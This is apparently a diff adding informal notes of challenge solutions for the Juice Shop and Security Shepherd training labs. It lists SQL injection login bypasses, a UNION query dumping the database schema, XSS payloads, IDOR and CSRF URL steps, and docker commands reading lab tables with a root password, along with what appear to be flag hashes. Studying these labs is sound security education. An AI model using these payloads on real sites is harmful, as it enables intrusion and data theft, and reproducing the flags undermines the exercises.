@@ -1,0 +1,91 @@
+1. Sensitive data exposure 
+
+port/ftp/acquistions.md
+
+2. Security misconfiguration
+
+port/metrics
+
+3. Injection SQL
+
+username:- ' OR TRUE--
+password:- 1234
+
+4. Broken access control 
+
+view basket
+add item
+inspect 
+application
+session storage -> localhosturl -> key > value(change the value and press enter)
+
+
+5. SQL
+
+yourportnumber/rest/products/search?q=qwert%27))%20UNION%20SELECT%201,2,3,sql,5,6,7,8,9%20FROM%20sqlite_master--
+
+6. Broken access control 
+
+click item -> add review -> inspect -> networks -> 201 (right click copy-> copy as fetch -> paste into the console and change the gmail name(author name) and press enter)
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+shepherd
+
+
+1. CSRF:- 
+
+Step 1: add your ip and port
+Eg :- http://192.168.20.113:30221
+
+Step 2
+"GET /root/grantComplete/csrfLesson?userId=exampleId"
+
+Mentioned in the page and replace the exampleId with the id on the page
+
+http://192.168.20.113:30221/root/grantComplete/csrfLesson?userId=1920245357
+
+2. SQL INJECTION:- " OR 1=1 --(space)
+
+
+3. Cross site scripting:-
+
+<img src= x onerror = alert(1)>
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+1. reflected xss :- <script> alert('XSS') </script>
+
+2. stored xss:- <img src="#" onerror="alert('XSS')">.          Ishke liye, profile mein Jake bold kardo
+
+
+3. idor:- port/orders/1 and press enter
+
+
+NANOCORP REFLECTED XSS NOT WORKING??? FOR ANYONE
+same not 
+
+1 n 2 of this is not working, lmk if u did reply below
+
+
+
+extra:--
+
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SHOW DAiTABASES;"
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM tb_users;" SqlInjLesson
+7f6bf34080979e0cebda5672e989c07ceec9fa4ee7b7c17c9e3ce26bc63e03c1
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SELECT * FROM customers;" SqlChalOne
+fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f
+
+<iframe src='#' onload='alert("XSS")'></iframe>
